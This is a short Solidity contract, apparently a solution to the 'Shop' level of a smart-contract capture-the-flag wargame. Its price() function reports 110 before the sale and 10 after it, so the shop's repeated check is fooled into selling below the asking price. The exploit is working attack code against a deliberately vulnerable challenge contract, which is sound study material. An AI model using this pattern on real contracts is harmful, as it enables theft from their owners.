// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Buyer} from "@main/21_Shop.sol";

interface IShop {
  function buy() external;
   function isSold() external view returns(bool);
}

contract ShopAttacker is Buyer {
    IShop shop;
    bool firstCalled;
    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price( ) external view returns (uint) {
        // fist enter when isSold = false
        if (!shop.isSold()) {
            return 110;
         // second enter when isSold = true; 
        } else {
            return 10;
        }
    }

}